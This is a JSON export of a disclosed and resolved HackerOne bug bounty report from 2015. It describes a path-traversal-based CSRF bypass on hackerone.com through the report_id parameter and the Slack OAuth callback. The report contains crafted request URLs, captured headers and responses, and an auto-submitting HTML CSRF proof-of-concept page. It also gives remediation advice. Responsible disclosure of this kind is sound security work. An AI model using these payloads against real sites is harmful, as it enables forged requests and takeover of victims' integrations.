{
  "id": 99708,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85OTcwOA==",
  "url": "https://hackerone.com/reports/99708",
  "title": "Limited CSRF bypass.",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-11-14T19:45:05.651Z",
  "submitted_at": "2015-11-14T19:45:05.651Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "defmax",
    "url": "/defmax",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/759/d9f0b9418825e2418954f2cf260e32fe003c3593_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2015-12-02T05:25:37.160Z",
  "bug_reporter_agreed_on_going_public_at": "2015-12-02T05:25:36.698Z",
  "team_member_agreed_on_going_public_at": "2015-12-02T04:48:45.310Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello team \n\nI have found an very limited CSRF which could be valid for GET requests only. And the `Integrations` Tab is can be used in bypass \n\n##Description :\n\nEffected url :- https://hackerone.com/bugs?subject=anontest5667&report_id=0&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n \nEffected parameter :- `Report_id` \n\nWhen you submit an report id it loads the json of the report. \n\n######Request :- \nhttps://hackerone.com/bugs?subject=anontest5667&report_id=99698&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Response :- \nXHR finished loading: GET \"https://hackerone.com/reports/99698.json\".\n\nWhen we add an ? at the end we get \n\n######Request :- \nhttps://hackerone.com/bugs?subject=anontest5667&report_id=99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Response :- \nXHR finished loading: GET \"https://hackerone.com/reports/99698?.json\".\n\nSo i have added `../../../` to get out from reports dirs,\n\n######Request :- \nhttps://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Response :- \n```\nGET /99698?.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: hnDDTUm26xeV9lKMm8pnjsNsXKpMEtitUNMa2PeEFlUNiHLoO2J0lOxJpIYxmnXnbF1hNQMwUdB3e9MErdDktQ==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n\n```\n\nAs you can see here we are out of reports folder and you can see CSRF token in header. So Now you can perform CSRF on get requests. so In a team there is a option for integration like slack. where we use oauth to Integrate. this is the only place where GET requests are performed. if we are able to bypass the state parameter validation we will be able to takeover the Team and in my theory I was only able to test slack and I was not able to bypass the validation, I have requested for other integrations ticket #8741. so here is the theory \n\n#####oauth request :- \nhttps://slack.com/oauth/authorize?client_id=2174110321.11522100978&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback&response_type=code&scope=incoming-webhook&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\n\n#####Response:\nhttps://hackerone.com/auth/slack/callback?code={CODE}&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\n\n\nSo now lets try to use this in our CSRF url :- \n\n######Request:\nhttps://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F/auth/slack/callback?code=14582397537.14583911921.010c282773&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Request of CSRF :-\n```\nGET //auth/slack/callback?code.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: BNkBdXZy5Yi14v1pV0PMwOXB8xfg+HuiBFE36dPJNraPIbDQBKZ6C8xdC2P9E96pSvDOiK/a8t8j+f41iZ3EVg==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n```\n\n######Reponse :- \n\n```\nHTTP/1.1 302 Found\nServer: cloudflare-nginx\nDate: Sat, 14 Nov 2015 19:20:09 GMT\nContent-Type: text/plain; charset=utf-8\nContent-Length: 9\nConnection: keep-alive\nCache-Control: no-cache\nCf-Railgun: c8927a839b stream 0.000000 0231 5f99\nContent-Security-Policy: default-src 'none'; connect-src 'self'; font-src 'self'; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src 'self' data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src 'self'; object-src 'none'; script-src 'self' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&sentry_key=b7f63dee2a404d5e83fff96c50bd700f\nLocation: /auth/failure?message=csrf_detected&origin=https%3A%2F%2Fhackerone.com&strategy=slack\n```\n\nYou can see the CSRF has failed. So the problem was with .json at the end of the request. so it blocking our parameters to pass. so i have just url encoded everything and added a fake parameter to handle that json \n\npayload = `code=14582397537.14583819952.b7ff4c7e48&state=9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55&asd=`\n\nUrl encoded :- `code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D`\n\n\n######Request:- \nhttps://hackerone.com/bugs?subject=user&report_id=../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&view=open&substates[]=new&substates[]=needs-more-info&substates[]=triaged&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n\n######Request of CSRF:- \n```\nGET /auth/slack/callback?code=14582397537.14583911921.010c282773&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2&asd=.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: w3CpXrUUjtFVEWBdGu67hWO1drWIOLJn7dwzQj/cdoxIiBj7x8ARUiyullewvqnszIRLKscaOxrKdPqeZYiEbA==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n\n```\n\n######Response :- \n\n```\nHTTP/1.1 302 Found\nServer: cloudflare-nginx\nDate: Sat, 14 Nov 2015 19:30:14 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 113\nConnection: keep-alive\nCache-Control: private, no-cache, no-store, must-revalidate\nCf-Railgun: 5d12521a91 stream 0.000000 0231 5f99\nContent-Disposition: inline; filename=\"response.html\"\nContent-Security-Policy: default-src 'none'; connect-src 'self'; font-src 'self'; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src 'self' data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src 'self'; object-src 'none'; script-src 'self' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&sentry_key=b7f63dee2a404d5e83fff96c50bd700f\nLocation: https://hackerone.com/anontest5667/integrations\n\n<html><body>You are being <a href=\"https://hackerone.com/anontest5667/integrations\">redirected</a>.</body></html>\n```\n\nThis 302 redirect is for the successfull integration. as i already said i wasnt able to bypass slack state parameter validation but  maybe other maybe vulnerable, I leave it on you to fix it or wont fix\n\n\n#####Html code:- \n\n```\n<html>\n\t<head>\n\t\t<title> CSRF Attack</title>\n\t</head>\n\t\n\t<body onload=\"document.createElement('form').submit.call(document.getElementById('myForm'))\">\n\t<center><h1>Integration add CSRF</h1></center>\n<form id=\"myForm\" name=\"myForm\" method=\"GET\" action=\"https://hackerone.com/bugs\">\n<input type=\"hidden\" name=\"report_id\" value=\"../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D\"/>\n<center><input type=\"submit\" name=\"submit\"/></center>\n</form>\n\n\t\n\t</body>\n<html>\n\n```\n\n#####Remediation :\ninput validation should be done as if only integer is accepted like you do here https://hackerone.com/reports/asd\n\nLet me know if you need anything \n\nRegards\n*__N B__*\n",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-01-01T04:48:45.752Z",
  "allow_singular_disclosure_after": -256201273.3052304,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "sameerphad72",
    "zeroxyele",
    "savitar0x01",
    "hussein98d",
    "fantam1",
    "japz",
    "shivammusic",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
